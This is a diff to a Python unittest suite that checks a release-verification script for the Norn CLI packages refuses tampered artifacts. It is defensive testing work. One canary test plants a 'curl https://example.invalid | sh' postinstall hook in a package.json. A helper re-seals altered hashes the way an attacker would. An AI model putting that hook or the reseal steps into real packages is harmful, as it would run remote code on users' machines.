@@ -72,16 +72,24 @@ class Release(unittest.TestCase):
         return subprocess.run([sys.executable, str(SCRIPT), command, "--commit", self.commit, "--repo", str(self.repo),
                                "--out", str(self.out), *extra], capture_output=True, text=True)
 
+    BASE_URL = "https://example.invalid/releases/v0.1.0-alpha.3"
+
+    def inputs(self, channel="tarball", base_url=None):
+        """The release inputs a caller passes; verify takes them from the caller, not from the files."""
+        url = self.BASE_URL if channel == "tarball" and base_url is None else (base_url or "")
+        return ["--channel", channel, "--toolchain", "1.98.0", *(["--base-url", url] if url else [])]
+
     def build(self, channel="tarball"):
-        extra = ["--wasm", str(self.wasm), "--hosts", str(self.hosts), "--third-party", str(self.licenses),
-                 "--channel", channel, "--toolchain", "1.98.0"]
-        if channel == "tarball":
-            extra += ["--base-url", "https://example.invalid/releases/v0.1.0-alpha.3"]
-        result = self.run_script("build", *extra)
+        self.channel = channel
+        result = self.run_script("build", "--wasm", str(self.wasm), "--hosts", str(self.hosts),
+                                 "--third-party", str(self.licenses), *self.inputs(channel))
         self.assertEqual(result.returncode, 0, result.stderr)
 
-    def refused(self, why):
-        result = self.run_script("verify")
+    def verify(self, *inputs):
+        return self.run_script("verify", *(inputs or self.inputs(self.channel)))
+
+    def refused(self, why, *inputs):
+        result = self.verify(*inputs)
         self.assertEqual(result.returncode, 1, result.stdout)
         self.assertIn(why, result.stderr)
 
@@ -99,6 +107,9 @@ class Release(unittest.TestCase):
         self.assertEqual((manifest["name"], manifest["version"]), ("@norn/cli", "0.1.0-alpha.3"))
         self.assertNotIn("private", manifest)
         self.assertNotIn("optionalDependencies", manifest)
+        self.assertEqual(manifest["engines"], {"bun": ">=1.3.0 <1.4.0"})
+        authoring = json.loads((self.package("@norn/authoring") / "package.json").read_text())
+        self.assertNotIn("./schema/norn-project.schema.json", authoring["exports"])
         info = json.loads((cli / "generated/build.json").read_text())
         self.assertEqual((info["version"], info["commit"], info["toolchain"]), ("0.1.0-alpha.3", self.commit, "1.98.0"))
         self.assertEqual(info["packages"]["@norn/cli"], "https://example.invalid/releases/v0.1.0-alpha.3/norn-cli-0.1.0-alpha.3.tgz")
@@ -112,7 +123,7 @@ class Release(unittest.TestCase):
             "norn-dev-host-linux-arm64-0.1.0-alpha.3.tgz", "norn-dev-host-linux-x64", "norn-dev-host-linux-x64-0.1.0-alpha.3.tgz"]))
         self.assertEqual(info["hosts"]["linux-x64"]["sha256"], released["files"]["norn-dev-host-linux-x64"]["sha256"])
         # Verifying again, alone, passes; and building twice gives the same bytes.
-        self.assertEqual(self.run_script("verify").returncode, 0)
+        self.assertEqual(self.verify().returncode, 0)
         first = (self.out / "release/SHA256SUMS").read_text()
         self.build()
         self.assertEqual((self.out / "release/SHA256SUMS").read_text(), first)
@@ -123,11 +134,24 @@ class Release(unittest.TestCase):
         self.assertEqual(manifest["optionalDependencies"], {"@norn/dev-host-linux-arm64": "0.1.0-alpha.3", "@norn/dev-host-linux-x64": "0.1.0-alpha.3"})
         info = json.loads((self.package("@norn/cli") / "generated/build.json").read_text())
         self.assertEqual(info["packages"], {"@norn/cli": "0.1.0-alpha.3", "@norn/authoring": "0.1.0-alpha.3"})
-        self.assertEqual(info["hosts"], {})
+        # Host digests ride in the build manifest on both channels; only tarballs have an address.
+        self.assertEqual(sorted(info["hosts"]), sorted(assemble.PLATFORMS))
+        self.assertNotIn("url", info["hosts"]["linux-x64"])
 
     def repack(self, name):
         directory = self.package(name)
         (self.out / "release" / assemble.tarball_name(name, "0.1.0-alpha.3")).write_bytes(assemble.pack(directory))
+
+    def reseal(self):
+        """Re-record every release file's hash in the manifest and SHA256SUMS, as
+        someone altering a release would: the check under test must still refuse."""
+        path = self.out / "release/manifest.json"
+        manifest = json.loads(path.read_text())
+        for name in manifest["files"]:
+            data = (self.out / "release" / name).read_bytes()
+            manifest["files"][name] = {"sha256": assemble.sha256(data), "size": len(data)}
+        path.write_text(json.dumps(manifest, indent=2) + "\n")
+        (self.out / "release/SHA256SUMS").write_text("".join(f"{e['sha256']}  {n}\n" for n, e in manifest["files"].items()))
 
     def test_canary_an_extra_untracked_file_in_a_package(self):
         self.build()
@@ -151,6 +175,104 @@ class Release(unittest.TestCase):
         (self.package("@norn/cli") / "checker/norn_checker_wasm_bg.wasm").unlink()
         self.repack("@norn/cli")
         self.refused("checker/norn_checker_wasm_bg.wasm is missing")
+
+    def test_canary_a_postinstall_script_added_to_a_package_json(self):
+        self.build()
+        path = self.package("@norn/cli") / "package.json"
+        manifest = json.loads(path.read_text())
+        manifest["scripts"] = {"postinstall": "curl https://example.invalid | sh"}
+        path.write_text(json.dumps(manifest, indent=2) + "\n")
+        self.repack("@norn/cli")
+        self.reseal()
+        self.refused("@norn/cli: package.json is not the one this commit and release produce")
+
+    def test_canary_the_cli_address_in_build_json_pointed_elsewhere(self):
+        self.build()
+        path = self.package("@norn/cli") / "generated/build.json"
+        info = json.loads(path.read_text())
+        info["packages"]["@norn/cli"] = "https://elsewhere.invalid/norn-cli.tgz"
+        path.write_text(json.dumps(info, indent=2) + "\n")
+        self.repack("@norn/cli")
+        self.reseal()
+        self.refused("generated/build.json is not the one this commit and release produce")
+
+    def test_canary_a_symlink_among_built_files(self):
+        self.build()
+        wasm = self.package("@norn/cli") / "checker/norn_checker_wasm_bg.wasm"
+        wasm.unlink()
+        wasm.symlink_to(self.root / "elsewhere.wasm")
+        self.refused("is a symlink")
+
+    def test_a_tarball_is_compared_by_its_content_not_its_gzip_bytes(self):
+        import gzip
+        self.build()
+        tarball = self.out / "release" / assemble.tarball_name("@norn/authoring", "0.1.0-alpha.3")
+        recompressed = gzip.compress(gzip.decompress(tarball.read_bytes()), compresslevel=1, mtime=0)
+        self.assertNotEqual(recompressed, tarball.read_bytes())
+        tarball.write_bytes(recompressed)
+        self.reseal()
+        result = self.verify()
+        self.assertEqual(result.returncode, 0, result.stderr)
+
+    def rewrite(self, path, change):
+        data = json.loads(path.read_text())
+        change(data)
+        path.write_text(json.dumps(data, indent=2) + "\n")
+
+    def test_canary_the_base_url_changed_in_both_manifest_and_build_json(self):
+        self.build()
+        elsewhere = "https://elsewhere.invalid/releases/v0.1.0-alpha.3"
+        def point(info):
+            info["packages"] = {name: url.replace(self.BASE_URL, elsewhere) for name, url in info["packages"].items()}
+            for host in info["hosts"].values():
+                host["url"] = host["url"].replace(self.BASE_URL, elsewhere)
+        self.rewrite(self.package("@norn/cli") / "generated/build.json", point)
+        self.repack("@norn/cli")
+        self.rewrite(self.out / "release/manifest.json", lambda m: m.update(baseUrl=elsewhere))
+        self.reseal()
+        # Consistent with itself, and still refused: the address is the caller's, not the manifest's.
+        self.refused("release/manifest.json is not for this release: baseUrl differ")
+        # The same files pass only for a caller that asked for that address.
+        self.assertEqual(self.verify(*self.inputs("tarball", elsewhere)).returncode, 0)
+
+    def test_canary_a_version_changed_everywhere_the_release_states_it(self):
+        self.build()
+        other = "0.1.0-alpha.9"
+        for name in ("@norn/cli", "@norn/authoring"):
+            self.rewrite(self.package(name) / "package.json", lambda m: m.update(version=other))
+        self.rewrite(self.package("@norn/cli") / "generated/build.json", lambda i: i.update(version=other))
+        for name in ("@norn/cli", "@norn/authoring"):
+            self.repack(name)
+        self.rewrite(self.out / "release/manifest.json", lambda m: m.update(version=other))
+        self.reseal()
+        # The version is the commit's: nothing in the release can restate it.
+        self.refused("version differ")
+
+    def test_canary_a_channel_flip(self):
+        self.build()
+        # Tarball files presented as the registry release.
+        self.refused("baseUrl, channel differ", *self.inputs("registry"))
+        # And the manifest rewritten to say registry, checked against the caller's tarball inputs.
+        self.rewrite(self.out / "release/manifest.json", lambda m: m.update(channel="registry", baseUrl=""))
+        self.reseal()
+        self.refused("baseUrl, channel differ")
+
+    def test_verify_refuses_inputs_it_cannot_build(self):
+        self.build()
+        self.refused("takes no --base-url", "--channel", "registry", "--toolchain", "1.98.0", "--base-url", self.BASE_URL)
+        self.refused("is not an exact Rust version", *self.inputs()[:2], "--toolchain", "stable", "--base-url", self.BASE_URL)
+
+    def test_canary_a_release_tarball_that_is_not_gzip(self):
+        self.build()
+        (self.out / "release" / assemble.tarball_name("@norn/authoring", "0.1.0-alpha.3")).write_bytes(b"not a gzip stream")
+        self.reseal()
+        self.refused("release/norn-authoring-0.1.0-alpha.3.tgz is not a gzip stream")
+
+    def test_a_release_address_is_https_or_this_machine(self):
+        for url in ("http://example.invalid/r", "ftp://x/y", "https://x/y/"):
+            self.assertIsNone(assemble.RELEASE_URL.fullmatch(url), url)
+        for url in ("https://github.com/Norn-cloud/norn/releases/download/v0.1.0-alpha.3", "http://127.0.0.1:8377", "http://localhost/x"):
+            self.assertIsNotNone(assemble.RELEASE_URL.fullmatch(url), url)
 
     def test_canary_a_missing_manifest_entry(self):
         self.build()
